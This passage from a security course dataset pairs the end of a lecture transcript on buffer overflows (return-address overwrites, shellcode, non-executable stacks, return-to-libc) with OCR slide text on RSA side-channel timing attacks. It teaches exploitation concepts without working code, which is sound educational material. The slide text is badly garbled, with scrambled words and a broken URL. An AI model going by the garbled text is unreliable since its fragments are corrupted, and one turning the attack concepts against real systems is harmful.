            </slice>
            <slice>
              <time_slice>1:09:44</time_slice>
              <text_slice>So then when we do the overflow,
it overflows up there and maybe</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:48</time_slice>
              <text_slice>doesn't hit anything bad.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:49</time_slice>
              <text_slice>I guess what you're
saying is that,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:50</time_slice>
              <text_slice>well, maybe we had
a buffer down there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:52</time_slice>
              <text_slice>And if we had a buffer
down there, then yeah,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:54</time_slice>
              <text_slice>that seems kind of unfortunate.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:55</time_slice>
              <text_slice>It could overrun
this return address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:58</time_slice>
              <text_slice>So you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:59</time_slice>
              <text_slice>So you could still
run into problems</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:01</time_slice>
              <text_slice>on this stack growing up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:03</time_slice>
              <text_slice>But what about
this exact program?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:08</time_slice>
              <text_slice>Is this particular
program safe on machines</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:11</time_slice>
              <text_slice>where the stack grows up?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:12</time_slice>
              <text_slice>So just to recap what the
program read is this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>AUDIENCE: Still
going to overwrite</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:19</time_slice>
              <text_slice>[INAUDIBLE] as a return value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>So that's actually
clever, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:22</time_slice>
              <text_slice>So this is the stack
frame for redirect.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:29</time_slice>
              <text_slice>I guess it actually spans
all the way up here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:31</time_slice>
              <text_slice>But what actually happens
when you call getS() is that</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:34</time_slice>
              <text_slice>redirect makes a function call.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:36</time_slice>
              <text_slice>It actually saves its return
address up here on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:40</time_slice>
              <text_slice>And then getS() starts running.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:42</time_slice>
              <text_slice>And getS() puts its
own saved EBP up here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:45</time_slice>
              <text_slice>And getS() is going to post
its own variables higher up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:50</time_slice>
              <text_slice>And then getS() is going
to fill in the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:54</time_slice>
              <text_slice>So this is still problematic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:55</time_slice>
              <text_slice>Basically, the buffer is
surrounded by return initials</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:57</time_slice>
              <text_slice>on all sides.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:59</time_slice>
              <text_slice>Either way, you're going to
be able to overflow something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:02</time_slice>
              <text_slice>So at what point-- suppose we
had a stack growing up machine.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:06</time_slice>
              <text_slice>At what point would
you be able to take</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:08</time_slice>
              <text_slice>control of the program's
execution then?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:14</time_slice>
              <text_slice>Yes, and that is actually
even easier in some ways.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:16</time_slice>
              <text_slice>You don't have to wait
until redirect returns.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:18</time_slice>
              <text_slice>And maybe there was like, stuff
that was going to mess you up</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:20</time_slice>
              <text_slice>like this A to i.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:21</time_slice>
              <text_slice>No.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:21</time_slice>
              <text_slice>It's actually easier, because
getS() is going to overflow</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:24</time_slice>
              <text_slice>the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:24</time_slice>
              <text_slice>It's going to change
the return address</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:26</time_slice>
              <text_slice>and then immediately
return and immediately</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:28</time_slice>
              <text_slice>jump to wherever you sort
of tried to construct,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:32</time_slice>
              <text_slice>makes sense.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:34</time_slice>
              <text_slice>So what happens if we
have a program like this</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:38</time_slice>
              <text_slice>that's pretty boring?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:39</time_slice>
              <text_slice>There's like no real
interesting code to jump to.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:41</time_slice>
              <text_slice>All you can do is get it to
print different x values here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:45</time_slice>
              <text_slice>What if you want to do
something interesting that you</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:47</time_slice>
              <text_slice>didn't-- yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:48</time_slice>
              <text_slice>AUDIENCE: I mean, if you
have an extra cable stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:52</time_slice>
              <text_slice>you could put
arbitrary code that,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:54</time_slice>
              <text_slice>for example, executes a shell?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:56</time_slice>
              <text_slice>PROFESSOR: Yeah yeah yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:57</time_slice>
              <text_slice>So that's kind of clever,
right, because you actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:59</time_slice>
              <text_slice>can supply other inputs, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:01</time_slice>
              <text_slice>So at least, well-- there's
some defenses against this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:04</time_slice>
              <text_slice>And we'll go over these
in subsequent lectures.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:06</time_slice>
              <text_slice>But in principle, you could
have the return address here</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:10</time_slice>
              <text_slice>that you override on either the
stack up or stack down machine.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:13</time_slice>
              <text_slice>And instead of pointing
it to some existing code,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:16</time_slice>
              <text_slice>like the printf
inside of main, we</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:18</time_slice>
              <text_slice>can actually have the return
address point into the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:22</time_slice>
              <text_slice>So it's previously just
some location on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:24</time_slice>
              <text_slice>But you could jump there
and treat it as executable.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:27</time_slice>
              <text_slice>So as part of your
request, you'll actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:29</time_slice>
              <text_slice>send some bytes of
data to the server,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:32</time_slice>
              <text_slice>and then have the return address
or the thing you overwrite here</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:35</time_slice>
              <text_slice>point to the base of the
buffer, and you'll just</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:37</time_slice>
              <text_slice>keep going from there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:39</time_slice>
              <text_slice>So then you'll be able
to sort of provide</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:41</time_slice>
              <text_slice>the code you want
to run, jump to it,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:42</time_slice>
              <text_slice>and get the server to run it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:44</time_slice>
              <text_slice>And in fact, traditionally,
in Unix systems,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:46</time_slice>
              <text_slice>what adversaries would often
do is just ask the operating</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:49</time_slice>
              <text_slice>system to execute the
binsh command, which</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:51</time_slice>
              <text_slice>lets you sort of type in
arbitrary shell commands</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:53</time_slice>
              <text_slice>after that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:54</time_slice>
              <text_slice>So as a result, this
thing, this piece</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:56</time_slice>
              <text_slice>of code you inject
into this buffer,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:57</time_slice>
              <text_slice>was often called, sort of for
historical reasons, shell code.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:01</time_slice>
              <text_slice>And you'll try to construct
some in this lab one as well.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:06</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:07</time_slice>
              <text_slice>Make sense, what
you can do here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:09</time_slice>
              <text_slice>Any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:10</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:11</time_slice>
              <text_slice>AUDIENCE: Is there a separation
between code and data?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:13</time_slice>
              <text_slice>PROFESSOR: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:14</time_slice>
              <text_slice>So is there a separation
between code and data here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>At least, well,
historically, many machines</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:20</time_slice>
              <text_slice>didn't enforce any
separation of code and data.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:22</time_slice>
              <text_slice>You'd just have a flat
memory address space.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:24</time_slice>
              <text_slice>The stack pointer
points somewhere.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:26</time_slice>
              <text_slice>The code pointer
points somewhere else.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:28</time_slice>
              <text_slice>And you just execute wherever
the code pointer, instruction</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:30</time_slice>
              <text_slice>pointer is pointing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:32</time_slice>
              <text_slice>Modern machines try to
provide some defenses</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:35</time_slice>
              <text_slice>for these kinds of attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:36</time_slice>
              <text_slice>And what modern
machines often do is,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:39</time_slice>
              <text_slice>they actually
associate permissions</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:40</time_slice>
              <text_slice>with various memory regions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:42</time_slice>
              <text_slice>And one of the
permissions is execute.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:44</time_slice>
              <text_slice>So the part of your
32-bit or 64-bit address</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:47</time_slice>
              <text_slice>space that contains code
has the execute permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:51</time_slice>
              <text_slice>So if your instruction
pointer points there,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:53</time_slice>
              <text_slice>the CPU will actually
run those things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:55</time_slice>
              <text_slice>And the stack and other data
portions of your address space</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:59</time_slice>
              <text_slice>typically don't have
the execute permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:00</time_slice>
              <text_slice>So if you happen to somehow
set your instruction pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:03</time_slice>
              <text_slice>to some non-code memory
location, you can set it,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:07</time_slice>
              <text_slice>but the CPU will
refuse to execute it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:10</time_slice>
              <text_slice>So this is a reasonably
nice way to defend</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:13</time_slice>
              <text_slice>against these kinds of attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:15</time_slice>
              <text_slice>But it doesn't prevent
quite everything.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:18</time_slice>
              <text_slice>So just a question.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:19</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:20</time_slice>
              <text_slice>So how would you
bypass this if you</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:22</time_slice>
              <text_slice>had this non-executable stack?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:24</time_slice>
              <text_slice>You actually saw this
example earlier, right,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:26</time_slice>
              <text_slice>when I actually jumped
to the middle of main.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:30</time_slice>
              <text_slice>So that was a way of sort
of exploiting this buffer</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:34</time_slice>
              <text_slice>overflow without having to
inject new code of my own.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:36</time_slice>
              <text_slice>So even if the stack
was non-executable,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:39</time_slice>
              <text_slice>I would still be able to
jump in the middle of main.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:41</time_slice>
              <text_slice>In this particular case,
it's kind of boring.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:43</time_slice>
              <text_slice>It just prints x and crashes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:45</time_slice>
              <text_slice>But in other
situations, you might</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:46</time_slice>
              <text_slice>have other pieces of
code in your program</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:48</time_slice>
              <text_slice>that are doing interesting
stuff that you really</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:50</time_slice>
              <text_slice>do want to execute.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:51</time_slice>
              <text_slice>And that's sort of called return
to libc attacks for, again,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:54</time_slice>
              <text_slice>somewhat historical reasons.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:56</time_slice>
              <text_slice>But it is a way to bypass
the security measures.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:59</time_slice>
              <text_slice>So in the context
of buffer overflows,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:02</time_slice>
              <text_slice>there's not really
a clear cut solution</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:06</time_slice>
              <text_slice>that provides perfect protection
against these mistakes</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:08</time_slice>
              <text_slice>because, at the end of the
day, the programmer did</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:10</time_slice>
              <text_slice>make some mistake in
writing this source code.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:12</time_slice>
              <text_slice>And the best way to fix it
is probably just to change</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:14</time_slice>
              <text_slice>the source code and make sure
you don't call getS() very</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:17</time_slice>
              <text_slice>much, like the
compiler warned you.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:18</time_slice>
              <text_slice>And there's more subtle
things that the compiler</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:20</time_slice>
              <text_slice>doesn't warn you about.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:20</time_slice>
              <text_slice>And you still have to
avoid making those calls.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:23</time_slice>
              <text_slice>But because it's
hard, in practice,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:26</time_slice>
              <text_slice>to change all the
software out there,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:28</time_slice>
              <text_slice>many people try to
devise techniques</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:30</time_slice>
              <text_slice>that make it more difficult
to exploit these bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:33</time_slice>
              <text_slice>For example, making the
stack non-executable,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:35</time_slice>
              <text_slice>so you can't inject the
shell code onto the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:39</time_slice>
              <text_slice>and you have to do something
slightly more elaborate.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:41</time_slice>
              <text_slice>And next couple of
lectures, next two lectures,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:45</time_slice>
              <text_slice>actually, we'll look at
these defense techniques.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:47</time_slice>
              <text_slice>They're not all perfect.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:48</time_slice>
              <text_slice>But they do, in
practice, make it</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:50</time_slice>
              <text_slice>much more difficult for that
hacker to exploit things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:52</time_slice>
              <text_slice>Question?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:53</time_slice>
              <text_slice>AUDIENCE: I just have a general
administrative question.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:54</time_slice>
              <text_slice>PROFESSOR: Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:55</time_slice>
              <text_slice>AUDIENCE: I was wondering
if there was a final?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:56</time_slice>
              <text_slice>And also if there are
quizzes, and what dates--</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:58</time_slice>
              <text_slice>PROFESSOR: Oh yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:00</time_slice>
              <text_slice>Yeah, I think if you go
to the schedule page,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:02</time_slice>
              <text_slice>there's two quizzes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:03</time_slice>
              <text_slice>And there's no final
during the final week,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:05</time_slice>
              <text_slice>but there's a quiz
right before it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:08</time_slice>
              <text_slice>So you're free for
the final week,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:09</time_slice>
              <text_slice>but there's still something
at the end of the class.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:12</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:13</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:14</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:14</time_slice>
              <text_slice>So I think that's probably
it for buffer overflows.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:17</time_slice>
              <text_slice>I guess the one
question is, so what</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:19</time_slice>
              <text_slice>do you do about
mechanism problems?</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:21</time_slice>
              <text_slice>And the general answer is to
probably have fewer mechanisms.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:26</time_slice>
              <text_slice>So as we saw here,
if you're relying</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:27</time_slice>
              <text_slice>on every piece of software to
enforce your security policy,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:29</time_slice>
              <text_slice>you'll inevitably
have mistakes that</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:31</time_slice>
              <text_slice>allow an adversary to bypass
your mechanism to exploit</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:34</time_slice>
              <text_slice>some bug in the web server.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:35</time_slice>
              <text_slice>And a much better
design, and one but</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:37</time_slice>
              <text_slice>you will explore
in lab two, is one</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:39</time_slice>
              <text_slice>where you structure
your whole system</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:41</time_slice>
              <text_slice>so the security of
the system doesn't</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:42</time_slice>
              <text_slice>depend on all the
pieces of software</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:44</time_slice>
              <text_slice>enforcing your security policy.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:45</time_slice>
              <text_slice>The security policy
is going to be</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:47</time_slice>
              <text_slice>enforced by a small
number of components.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:48</time_slice>
              <text_slice>And the rest of
the stuff actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:49</time_slice>
              <text_slice>doesn't matter, for
security purposes,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:51</time_slice>
              <text_slice>if it's right or wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:52</time_slice>
              <text_slice>It's not going to violate
your security policy at all.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:55</time_slice>
              <text_slice>So this, kind of minimizing
your trusted computing base</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:58</time_slice>
              <text_slice>is a pretty powerful technique
to get around these mechanism</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:01</time_slice>
              <text_slice>bugs and problems that we've
looked at today, at least</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:04</time_slice>
              <text_slice>in a little bit of detail.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:05</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:06</time_slice>
              <text_slice>So read the paper for Monday.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:07</time_slice>
              <text_slice>And come to Monday's lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:08</time_slice>
              <text_slice>And submit the questions
on the website.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:10</time_slice>
              <text_slice>See you guys then.</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Side-Channel Attacks (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec16/</lecture_pdf_url>
      <lectureno>16</lectureno>
      <slides>
        <slide>
          <slideno>2</slideno>
          <text>o if	&#13; x==a1	&#13; (mod	&#13; p)	&#13; and	&#13; x==a2	&#13; (mod	&#13; q),	&#13; where	&#13; p	&#13; and	&#13; q	&#13; are	&#13; relatively	&#13; 
 prime,	&#13; then	&#13; there's	&#13; a	&#13; unique	&#13; solution	&#13; x==a	&#13; (mod	&#13; pq).	&#13; (
efficient	&#13; algorithm	&#13; for	&#13; computing	&#13; a)	&#13; and,	&#13; there's	&#13; an	&#13; 
 
 Suppose	&#13; we	&#13; want	&#13; to	&#13; compute	&#13; m	&#13; =	&#13; c^d	&#13; (mod	&#13; pq).	&#13; 
 CThen	&#13; use	&#13; Can	&#13; compute	&#13; m1	&#13; =	&#13; c^d	&#13; (mod	&#13; p),	&#13; and	&#13; m2	&#13; =	&#13; c^d	&#13; (mod	&#13; q).	&#13; 
 RT	&#13; to	&#13; compute	&#13; m	&#13; =	&#13; c^d	&#13; (mod	&#13; n)	&#13; from	&#13; m1,	&#13; m2;	&#13; it's	&#13; unique	&#13; and	&#13; fast.	&#13; 

	&#13; 
Optimization	&#13; 2:	&#13; Repeated	&#13; squaring	&#13; and	&#13; Sliding	&#13; windows.	&#13;  CC
omputing	&#13; m	&#13; from	&#13; m1	&#13; and	&#13; m2	&#13; using	&#13; Computing	&#13; m1	&#13; (or	&#13; m2)	&#13; is	&#13; ~4x	&#13; faster	&#13; than	&#13; computing	&#13; m	&#13; directly	&#13; (~quadratic
RT	&#13; is	&#13; ~negligible	&#13; in	&#13; comparison.	&#13; ).	&#13; 
So,	&#13; roughly	&#13; a	&#13; 2x	&#13; speedup. 	&#13; 
 
 Naive	&#13; approach	&#13; to	&#13; computing	&#13; c^d:	&#13; multiply	&#13; c	&#13; by	&#13; itself,	&#13; d	&#13; times.	&#13; Bette
o 
or	&#13; appr
c^(2x)   = (c^x)^2
 c^(2x+1) = (c^x)^2 * c
 oach,	&#13; called	&#13; repeated	&#13;  squaring:	&#13; 
o
o o To	&#13; compute	&#13; c^d,	&#13; first	&#13; compute	&#13; c^(floor(d/2)),	&#13; then	&#13; use	&#13; above	&#13; for	&#13; c^d.	&#13; Recursively	&#13; apply	&#13; until	&#13; the	&#13; computation	&#13; hits	&#13; c^0	&#13; =	&#13; 1.	&#13;  
 
o 
 Number	&#13; of	&#13; squarings:	&#13; |d|	&#13; 
Bette
o c^(2x)    = (c^x)^2 
o 
 r	&#13; yet	&#13; (sometimes),	&#13; called	&#13; sliding	&#13; window:	&#13; Number	&#13; of	&#13; multiplications:	&#13; number	&#13; of	&#13; 1	&#13; bits	&#13; in	&#13; d	&#13; 
c^(32x+1) = (c^x)^32 * c 
oc^(32x+3) = (c^x)^32 * c^3 
o ... 
o c^(32x+z) = (c^x)^32 * c^z, generally [where z&lt;=31]
o 
o CaThe	&#13; choice	&#13; of	&#13; pown
	&#13; p
 re-compute	&#13; a	&#13; table	&#13; of	&#13; all	&#13; necessary	&#13; c^z	&#13; powers,	&#13; store	&#13; in	&#13; memory.	&#13; 
Costs:	&#13; extra	&#13; memory,	&#13; extra	&#13; time	&#13; to	&#13; preer-of-2	&#13; constant	&#13; (e.g.,	&#13; 32)	&#13; dep
otime.	&#13; -compute	&#13; powers	&#13; ahead	&#13; of	&#13; ends	&#13; on	&#13; usage.	&#13;  
 
o NotOpee:	&#13; 
nSSLonl
	&#13; usy	&#13; p
ere
s	&#13; 3-compute	&#13; odd	&#13; powers	&#13; of	&#13; c	&#13; (use	&#13; first	&#13; rule	&#13; for	&#13; even).	&#13; 
2	&#13; (table	&#13; with	&#13; 16	&#13; pre
	&#13; 
Optimization	&#13; 3:	&#13; Montgomery	&#13; representation.	&#13; -computed	&#13; entries).	&#13; 
 Reducing	&#13; mod	&#13; p	&#13; each	&#13; time	&#13; (after	&#13; square	&#13; or	&#13; multiply)	&#13; is	&#13; expensive.	&#13; 
o 
o 
 Typical	&#13; implementation:	&#13; do	&#13; long	&#13; division,	&#13; find	&#13; remainder.	&#13; 
Idea	&#13; (by	&#13; Peter	&#13; Montgomery):	&#13; do	&#13; computations	&#13; in	&#13; 
o Hard	&#13; to	&#13; avoid	&#13; reduction:	&#13; otherwise,	&#13; value	&#13; g
anorow
ths	&#13; 
eex
o rponentia
Shift	&#13; the	&#13; base	&#13; (e.g.,	&#13; c)	&#13; into	&#13; different	&#13; representation	&#13; upfr	&#13; repr
ont.esentatilly.	&#13; 
	&#13; on.	&#13; 
Perform	&#13; modular	&#13; operations	&#13; in	&#13; this	&#13; representation	&#13; (will	&#13; be	&#13; cheaper).	&#13; 
 Shift	&#13; numbers	&#13; back	&#13; into	&#13; original	&#13; representation	&#13; when	&#13; done.	&#13; 
Montgomery	&#13; representation:	&#13; multiply	&#13; everything	&#13; by	&#13; some	&#13; factor	&#13; R.	&#13; o o 
o Ideally,	&#13; savings	&#13; from	&#13; reductions	&#13; outweia mod q        &lt;-&gt; aR mod q gh	&#13; cost	&#13; of	&#13; shifting. 	&#13; 
o b mod q        &lt;-&gt; bR mod q 
o c = a*b mod q  &lt;-&gt; cR mod q = (aR * bR)/R mod q 
3</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>hthtttp://wp://ed25519.cr.yp.tww.cs.unc.edu/~
o/	&#13; reiter/papers/2012/CCS.pdf 	&#13; 
	&#13; 
	&#13; 
9</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>o Measure	&#13; several	&#13; times,	&#13; take	&#13; the	&#13; median	&#13; value.	&#13; 
 
o Not
compute	&#13; time.	&#13; 	&#13; clear	&#13; w hy	&#13; median;	&#13; min	&#13; seems	&#13; like	&#13; it	&#13; would	&#13; be	&#13; the	&#13; true	&#13; 
Whyo 
o
	&#13; pr One	&#13; snag:	&#13; relatively	&#13; few	&#13; multiplications	&#13; by	&#13; g,	&#13; due	&#13; to	&#13; sliding	&#13; windows.	&#13; 
 Solution:	&#13; get	&#13; more	&#13; multiplications	&#13; by	&#13; values	&#13; close	&#13; to	&#13; g	&#13; (+	&#13; same	&#13; for	&#13; g_hi).	&#13; 
o Specifically,	&#13; pr
